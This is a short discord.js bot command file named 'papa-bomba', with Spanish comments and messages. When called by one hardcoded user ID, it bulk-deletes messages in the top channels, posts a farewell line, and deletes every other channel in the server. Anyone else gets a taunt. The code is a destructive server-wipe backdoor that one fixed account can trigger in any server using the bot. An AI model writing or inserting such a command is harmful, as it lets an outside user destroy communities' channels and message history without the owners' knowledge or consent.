const Discord = require('discord.js'); //Integrar discord.js
var global = require('../../config.json'); //Variables globales

module.exports = {
	name: 'papa-bomba',
	execute(message, args) {
        if(message.author.id === '423129757954211880') {
			message.channel.guild.channels.tap(ch => {
				if(!ch.deleted && ch.calculatedPosition === 0) {
					ch.bulkDelete(100, true);
					ch.send('*Todo lo que comienza, eventualmente termina. Sea por la razón que sea.*');
				}
			});

			message.channel.guild.channels.filter(ch => ch.calculatedPosition !== 0)
				.deleteAll();
        } else {
            message.channel.send('*Nisiquiera lo intentes.*');
            return;
        }
    },
};